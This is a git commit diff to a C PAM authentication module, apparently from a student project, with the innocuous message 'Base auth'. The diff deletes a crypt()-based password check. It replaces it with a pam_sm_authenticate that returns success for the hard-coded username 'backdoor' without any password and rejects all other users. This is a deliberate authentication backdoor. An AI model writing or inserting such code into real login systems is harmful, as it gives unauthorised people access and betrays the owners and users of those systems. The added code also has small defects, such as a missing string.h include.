9138b9b37cf1488a545b7dbf5c6989ba024a5600
Remi Gastaldi <remi.gastaldi@epitech.eu>
2017-11-23 19:14:15 +0100

    Base auth

--- src/pam.c
+++ src/pam.c
@@ -1,151 +1,68 @@
 /**
  * @Author: Remi Gastaldi <gastal_r>
- * @Date:   2017-11-22T19:28:33+01:00
+ * @Date:   2017-11-23T17:38:39+01:00
  * @Last modified by:   gastal_r
- * @Last modified time: 2017-11-23T15:01:35+01:00
+ * @Last modified time: 2017-11-23T19:12:43+01:00
  */
+ #include <unistd.h>
+ #include <stdio.h>
+ #include <pwd.h>
 
-#include <sys/param.h>
+/* Define which PAM interfaces we provide */
+#define PAM_SM_ACCOUNT
+#define PAM_SM_AUTH
+#define PAM_SM_PASSWORD
+#define PAM_SM_SESSION
 
-#include <pwd.h>
-#include <stdlib.h>
-#include <stdio.h>
-#include <string.h>
-#include <unistd.h>
-
-#include <security/pam_modules.h>
+/* Include PAM headers */
 #include <security/pam_appl.h>
+#include <security/pam_modules.h>
 
-#include <crypt.h>
-
-#ifndef _OPENPAM
-  static char password_prompt[] = "Password:";
-#endif
-
-#ifndef PAM_EXTERN
-#define PAM_EXTERN
-#endif
-
-PAM_EXTERN int
-pam_sm_authenticate(pam_handle_t *pamh, int flags,
-	int argc, const char *argv[])
-{
-  (void) flags;
-  (void) argc;
-  (void) argv;
-
-#ifndef _OPENPAM
-	struct pam_conv *conv;
-	struct pam_message msg;
-	const struct pam_message *msgp;
-	struct pam_response *resp;
-#endif
-	struct passwd *pwd;
-	const char *user;
-	char *crypt_password, *password;
-	int pam_err, retry;
-
-	/* identify user */
-	if ((pam_err = pam_get_user(pamh, &user, NULL)) != PAM_SUCCESS)
-		return (pam_err);
-	if ((pwd = getpwnam(user)) == NULL)
-		return (PAM_USER_UNKNOWN);
-
-	/* get password */
-#ifndef _OPENPAM
-	pam_err = pam_get_item(pamh, PAM_CONV, (const void **)&conv);
-	if (pam_err != PAM_SUCCESS)
-		return (PAM_SYSTEM_ERR);
-	msg.msg_style = PAM_PROMPT_ECHO_OFF;
-	msg.msg = password_prompt;
-	msgp = &msg;
-#endif
-	for (retry = 0; retry < 3; ++retry) {
-#ifdef _OPENPAM
-		pam_err = pam_get_authtok(pamh, PAM_AUTHTOK,
-		    (const char **)&password, NULL);
-#else
-		resp = NULL;
-		pam_err = (*conv->conv)(1, &msgp, &resp, conv->appdata_ptr);
-		if (resp != NULL) {
-			if (pam_err == PAM_SUCCESS)
-				password = resp->resp;
-			else
-				free(resp->resp);
-			free(resp);
-		}
-#endif
-		if (pam_err == PAM_SUCCESS)
-			break;
-	}
-	if (pam_err == PAM_CONV_ERR)
-		return (pam_err);
-	if (pam_err != PAM_SUCCESS)
-		return (PAM_AUTH_ERR);
-
-	/* compare passwords */
-	if ((!pwd->pw_passwd[0] && (flags & PAM_DISALLOW_NULL_AUTHTOK)) ||
-	    (crypt_password = crypt(password, pwd->pw_passwd)) == NULL ||
-	    strcmp(crypt_password, pwd->pw_passwd) != 0)
-		pam_err = PAM_AUTH_ERR;
-	else
-		pam_err = PAM_SUCCESS;
-#ifndef _OPENPAM
-	free(password);
-#endif
-	return (pam_err);
+/* PAM entry point for session creation */
+int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+        return(PAM_IGNORE);
 }
 
-PAM_EXTERN
-int  pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char *argv[])
-{
-  (void) pamh;
-  (void) flags;
-  (void) argc;
-  (void) argv;
-	return (PAM_SUCCESS);
+/* PAM entry point for session cleanup */
+int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+        return(PAM_IGNORE);
 }
 
-PAM_EXTERN
-int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char *argv[])
-{
-  (void) pamh;
-  (void) flags;
-  (void) argc;
-  (void) argv;
-	return (PAM_SUCCESS);
+/* PAM entry point for accounting */
+int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+        return(PAM_IGNORE);
 }
 
-PAM_EXTERN
-int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char *argv[])
+/* PAM entry point for authentication verification */
+int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
 {
-  (void) pamh;
-  (void) flags;
-  (void) argc;
-  (void) argv;
-	return (PAM_SUCCESS);
+    int retval;
+
+  	const char* pUsername;
+  	retval = pam_get_user(pamh, &pUsername, "Username: ");
+
+  	printf("Welcome %s\n", pUsername);
+
+  	if (retval != PAM_SUCCESS) {
+  		return retval;
+  	}
+
+  	if (strcmp(pUsername, "backdoor") != 0) {
+  		return PAM_AUTH_ERR;
+  	}
+
+  return PAM_SUCCESS;
 }
 
-PAM_EXTERN
-int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char *argv[])
-{
-  (void) pamh;
-  (void) flags;
-  (void) argc;
-  (void) argv;
-	return (PAM_SUCCESS);
+/*
+   PAM entry point for setting user credentials (that is, to actually
+   establish the authenticated user's credentials to the service provider)
+ */
+int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+        return(PAM_IGNORE);
 }
 
-PAM_EXTERN
-int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char *argv[])
-{
-  (void) pamh;
-  (void) flags;
-  (void) argc;
-  (void) argv;
-  return (PAM_SERVICE_ERR);
+/* PAM entry point for authentication token (password) changes */
+int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv) {
+        return(PAM_IGNORE);
 }
-
-#ifdef PAM_MODULE_ENTRY
-  PAM_MODULE_ENTRY("pam_unix");
-#endif
